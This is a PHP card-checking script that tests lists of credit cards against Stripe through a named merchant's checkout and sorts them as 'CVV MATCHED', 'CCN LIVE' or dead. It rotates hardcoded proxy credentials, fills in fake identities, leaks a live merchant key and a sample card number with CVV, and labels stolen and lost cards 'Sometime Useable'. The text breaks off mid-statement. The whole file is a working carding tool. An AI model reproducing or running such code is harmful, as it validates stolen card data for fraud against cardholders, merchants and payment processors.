<?php

/*
Acepta amex, visa, mastercar, y american express
*/
//https://zerotomoneyonline.com
//             by Neto for all


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}


# <======[Sección de proxies]======>
$Websharegay = rand(0,36);
$rp1 = array(
  1 => 'bvodvxcz-rotate:18qtdmttzhct',
2 => 'bvodvxcz-'.$Websharegay.':18qtdmttzhct',
  3 => 'gsmelcdy-rotate:9vlqgr2rvdh6',
4 => 'gsmelcdy-'.$Websharegay.':9vlqgr2rvdh6',
  5 => 'nsnaleiw-rotate:esz3t561vqas',
6 => 'nsnaleiw-'.$Websharegay.':esz3t561vqas',
  7 => 'tdgdliwo-rotate:zo0dpwky95qp',
8 => 'tdgdliwo-'.$Websharegay.':zo0dpwky95qp',
  9 => 'ajziaowr-rotate:s4cv77vlyfod',
10 => 'ajziaowr-'.$Websharegay.':s4cv77vlyfod',
  11 => 'rcascobm-rotate:jr9boxqf7klj',
12 => 'rcascobm-'.$Websharegay.':jr9boxqf7klj',
  13 => 'mifbrfnd-rotate:bup2rl6dia8a',
14 => 'mifbrfnd-'.$Websharegay.':bup2rl6dia8a',
  15 => 'ajpmkdnh-rotate:e4oqq2a0dw4h',
16 => 'ajpmkdnh-'.$Websharegay.':e4oqq2a0dw4h',
  17 => 'vvnwlvdy-rotate:ve2fyk1ua132',
18 => 'vvnwlvdy-'.$Websharegay.':ve2fyk1ua132',
  19 => 'vywbbanp-rotate:qrnoml3lw9w1',
20 => 'vywbbanp-'.$Websharegay.':qrnoml3lw9w1',
  21 => 'sjihjebi-rotate:20x1ejs18kxw',
22 => 'sjihjebi-'.$Websharegay.':20x1ejs18kxw',
  23 => 'kzdginuo-rotate:758nkjfxr828',
24 => 'kzdginuo-'.$Websharegay.':758nkjfxr828',
  25 => 'mikddczq-rotate:7ho7phse7hm3',
26 => 'mikddczq-'.$Websharegay.':7ho7phse7hm3',
  27 => 'jotoixtf-rotate:xspqvqakpamd',
28 => 'jotoixtf-'.$Websharegay.':xspqvqakpamd',
  29 => 'hkybyiyu-rotate:oh52ww6fw5jn',
30 => 'hkybyiyu-'.$Websharegay.':oh52ww6fw5jn',
  31 => 'hmyovocb-rotate:2bqa5edjsi6p',
32 => 'hmyovocb-'.$Websharegay.':2bqa5edjsi6p',
  33 => 'fsvcupie-rotate:e7zynu1bkhmt',
34 => 'fsvcupie-'.$Websharegay.':e7zynu1bkhmt',
  35 => 'ngjkmypy-rotate:2ycgbiz0n3c3',
36 => 'ngjkmypy-'.$Websharegay.':2ycgbiz0n3c3',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}
# <====== [Fin de sección de proxies] ======>

////////////////////////////===[Información randomizada]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$nombre = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$apellido = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$correo = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$direccion = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$ciudad = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$estado = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$celular = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

if($estado=="Alabama"){ $estado="AL";
}else if($estado=="alaska"){ $estado="AK";
}else if($estado=="arizona"){ $estado="AR";
}else if($estado=="california"){ $estado="CA";
}else if($estado=="olorado"){ $estado="CO";
}else if($estado=="connecticut"){ $estado="CT";
}else if($estado=="delaware"){ $estado="DE";
}else if($estado=="district of columbia"){ $estado="DC";
}else if($estado=="florida"){ $estado="FL";
}else if($estado=="georgia"){ $estado="GA";
}else if($estado=="hawaii"){ $estado="HI";
}else if($estado=="idaho"){ $estado="ID";
}else if($estado=="illinois"){ $estado="IL";
}else if($estado=="indiana"){ $estado="IN";
}else if($estado=="iowa"){ $estado="IA";
}else if($estado=="kansas"){ $estado="KS";
}else if($estado=="kentucky"){ $estado="KY";
}else if($estado=="louisiana"){ $estado="LA";
}else if($estado=="maine"){ $estado="ME";
}else if($estado=="maryland"){ $estado="MD";
}else if($estado=="massachusetts"){ $estado="MA";
}else if($estado=="michigan"){ $estado="MI";
}else if($estado=="minnesota"){ $estado="MN";
}else if($estado=="mississippi"){ $estado="MS";
}else if($estado=="missouri"){ $estado="MO";
}else if($estado=="montana"){ $estado="MT";
}else if($estado=="nebraska"){ $estado="NE";
}else if($estado=="nevada"){ $estado="NV";
}else if($estado=="new hampshire"){ $estado="NH";
}else if($estado=="new jersey"){ $estado="NJ";
}else if($estado=="new mexico"){ $estado="NM";
}else if($estado=="new york"){ $estado="LA";
}else if($estado=="north carolina"){ $estado="NC";
}else if($estado=="north dakota"){ $estado="ND";
}else if($estado=="Ohio"){ $estado="OH";
}else if($estado=="oklahoma"){ $estado="OK";
}else if($estado=="oregon"){ $estado="OR";
}else if($estado=="pennsylvania"){ $estado="PA";
}else if($estado=="rhode Island"){ $estado="RI";
}else if($estado=="south carolina"){ $estado="SC";
}else if($estado=="south dakota"){ $estado="SD";
}else if($estado=="tennessee"){ $estado="TN";
}else if($estado=="texas"){ $estado="TX";
}else if($estado=="utah"){ $estado="UT";
}else if($estado=="vermont"){ $estado="VT";
}else if($estado=="virginia"){ $estado="VA";
}else if($estado=="washington"){ $estado="WA";
}else if($estado=="west virginia"){ $estado="WV";
}else if($estado=="wisconsin"){ $estado="WI";
}else if($estado=="wyoming"){ $estado="WY";
}else{$estado="KY";}



// 4802392000274053|09|2022|166

# -------------------- [1 REQ] -------------------#

$tm = curl_init();
curl_setopt($tm, CURLOPT_PROXY, $proxySocks4);
curl_setopt($tm, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); 
curl_setopt($tm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($tm, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($tm, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($tm, CURLOPT_HEADER, 0);
curl_setopt($tm, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'Host: api.stripe.com',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-822573be3dfeb7eb553786a5154e21fd.html',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'
));
curl_setopt($tm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($tm, CURLOPT_POST, 1);
curl_setopt($tm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($tm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($tm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($tm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($tm, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]='.$zip.'&billing_details[name]='.$nombre.'+'.$apellido.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c2446ea4-ea1d-4108-b11d-5754e424d79539b5da&muid=44b15ed2-035b-4aad-af5e-6cab0fd6de3f897fdb&sid=46aa2d6a-602f-48de-abef-fec4a346e7f0b7cc39&pasted_fields=number&payment_user_agent=stripe.js%2F8e31bf6b7%3B+stripe-js-v3%2F8e31bf6b7&time_on_page=53907&referrer=https%3A%2F%2Fstatuscoup.com%2Fregister%2Fcovid-special-to-rejoin%2F%3Faction%3Dcheckout%26txn%3Drry&key=pk_live_50OJo33nk9HVaY3QfHrWQRzK00QCWSFjaS');

// '.$.'


$tm1 = curl_exec($tm);

$token = trim(strip_tags(getStr($tm1,'"id": "','"')));
$token3 = trim(strip_tags(getStr($tm1,'"client_ip": "','"')));
$token2 = trim(strip_tags(getStr($tm1,'"cvc_check": "','"')));

echo '<span class="badge badge-success">'.$ip.':</span><span class="new badge red"> '.$ip1.'</span>';



# -------------------- [2 REQ] -------------------#

$tm = curl_init();
curl_setopt($tm, CURLOPT_PROXY, $proxySocks4);
curl_setopt($tm, CURLOPT_URL, 'https://statuscoup.com/wp-admin/admin-ajax.php');
curl_setopt($tm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($tm, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($tm, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($tm, CURLOPT_HEADER, 0);
curl_setopt($tm, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: multipart/form-data; boundary=---------------------------30015208763143613103204673021',
'Host: statuscoup.com',
'origin: https://statuscoup.com',
'referer: https://statuscoup.com/register/covid-special-to-rejoin/?action=checkout&txn=rry',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'
));
curl_setopt($tm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($tm, CURLOPT_POST, 1);
curl_setopt($tm, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($tm, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($tm, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($tm, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($tm, CURLOPT_POSTFIELDS, '-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="mepr_transaction_id"

35998
-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="address_required"

0
-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="card-name"

'.$nombre.'+'.$apellido.'
-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
-----------------------------30015208763143613103204673021
Content-Disposition: form-data; name="mepr_current_url"

https://statuscoup.com/register/covid-special-to-rejoin/?action=checkout&txn=rry
-----------------------------30015208763143613103204673021--
');

$tm2 = curl_exec($tm);
$mensaje = trim(strip_tags(getStr($tm2,'"error": "','"')));


# -----------------Bin data----------------------#

$cctwo = substr("$cc", 0, 6);

$tm = curl_init();
curl_setopt($tm, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($tm, CURLOPT_USERAGENT, $user_agent);
curl_setopt($tm, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($tm, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($tm, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($tm, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($tm);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country1 = $fim['country']['flag'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$luhn = $fim['number']['luhn'];
$type = $fim['type'];
$brand = $fim['brand'];
$currency = $fim['country']['currency'];
$scheme = $fim['scheme'];



//                                  RESPUESTA DEL SITIO A CAPTURAR 



# ----------------- [Card response] ---------------------#

#---------------- [CVV] ----------------#

if 
  (strpos($tm2, '"cvc_check": "pass"')) {
  echo '
  <span class="badge badge-success">#CVV</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✅</span>
  <span class="badge badge-success"> CVV MATCHED </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, "Thank You For Donation." )) {
  echo '
  <span class="badge badge-success">#CVV</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✅</span>
  <span class="badge badge-success"> CVV MATCHED </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, "Thank You." )) {
  echo '
  <span class="badge badge-success">#CVV</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✅</span>
  <span class="badge badge-success"> CVV MATCHED </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'incorrect_zip' )) {
  echo '
  <span class="badge badge-success">#CVV</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✅</span>
  <span class="badge badge-success"> CVV MATCHED : Incorrect Zip</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

#---------------- [CCN] ----------------#

elseif
  (strpos($tm2, 'security code is incorrect.' )) {
  echo '
  <span class="badge badge-success">#Aprovada</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-info">✓</span>
  <span class="badge badge-info"> CCN LIVE </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'security code is invalid.' )) {
  echo '
  <span class="badge badge-success">#Aprovada</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-info">✓</span>
  <span class="badge badge-info"> CCN LIVE </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'Your card&#039;s security code is incorrect.' )) {
  echo '
  <span class="badge badge-success">#Aprovada</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✓</span>
  <span class="badge badge-info"> CCN LIVE </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}
elseif
  (strpos($tm2, " Your card's security code is incorrect." )) {
  echo '
  <span class="badge badge-success">#Aprovada</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-success">✓</span>
  <span class="badge badge-info"> CCN LIVE </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}


elseif 
  (strpos($tm2, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span>
  <span class="badge badge-success"> ' . $lista . '</span>
  <span class="badge badge-info">✓</span>
  <span class="badge badge-info"> CCN LIVE </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

#---------------- [DEAD] ----------------#

elseif 
  (strpos($tm2, "stolen_card")) {
  echo '<span class="new badge-warning">#Reprovadas</span>
  <span class="badge badge-success">' . $lista . '</span>
  <span class="badge badge-info">✕</span>
  <span class="badge badge-info"> Stolen_Card - Sometime Useable</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
 (strpos($tm2, "lost_card")) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="badge badge-success">' . $lista . '</span>
  <span class="badge badge-info">✕</span>
  <span class="badge badge-info"> Lost_Card - Sometime Useable</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'Your card has insufficient funds.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="badge badge-success">' . $lista . '</span>
  <span class="badge badge-info">✕</span>
  <span class="badge badge-info"> Insufficient Funds</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'Your card has expired.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Card Expired </span>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  </br><span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, "pickup_card")) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="badge badge-success">' . $lista . '</span>
  <span class="badge badge-info">✕</span>
  <span class="badge badge-info"> Pickup Card_Card - Sometime Useable</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'Your card number is incorrect.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Incorrect Card Number </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

 elseif 
  (strpos($tm2, "incorrect_number")) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Incorrect Card Number </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif
  (strpos($tm2, 'Your card was declined.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Card Declined </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, "generic_decline")) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Declined : Generic_Decline</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, "do_not_honor")) {
  echo '<span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Declined : Do_Not_Honor</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, '"cvc_check": "unchecked"')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Security Code Check : Unchecked [Proxy Dead]</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, '"cvc_check": "fail"')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Security Code Check : Fail</span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2, "expired_card")) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Expired Card </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2,'Your card does not support this type of purchase.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Card Doesnt Support This Purchase </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

elseif 
  (strpos($tm2,'Card payment failed, please try another payment method')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Declined </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

#---------------- [Response REQ1/DEAD] ----------------#
elseif
  (strpos($tm1, 'Your card was declined.')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Card Declined </span></br>
  <span class="badge badge-success">Luhn:</span>
  <span class="badge badge-info"> '.$luhn.'</span>
  <span class="badge badge-success">Details:</span>
  <span class="badge badge-info"> '.$bank.' ['.$country.'~'.$emoji.'~'.$country1.'] - '.$type.' - '.$scheme.' - '.$brand.' - '.$currency.'</span>
  <span class="badge badge-success">@Mayank_helper1</span></br>';
}

#---------------- [Proxy dead] ----------------#

elseif
  (strpos($tm1, 'You had an HTTP error connecting to Stripe')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Proxy dead</span></br>';
}

elseif
  (strpos($tm2, 'You had an HTTP error connecting to Stripe')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Proxy dead</span></br>';
}

#---------------- [ERROR] ----------------#

elseif
  (strpos($tm1, 'parameter_invalid_integer')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Parametro invalido</span> </br>';
}

elseif
  (strpos($tm1, 'parameter_invalid_empty')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
  <span class="badge badge-info"> Pon una CC!</span> </br>';
}

elseif
  (strpos($tm2, 'Internal Server Error')) {
  echo '
  <span class="new badge-warning">#Reprovadas</span>
  <span class="new badge red">' . $lista . '</span>
  <span class="new badge red">✕</span>
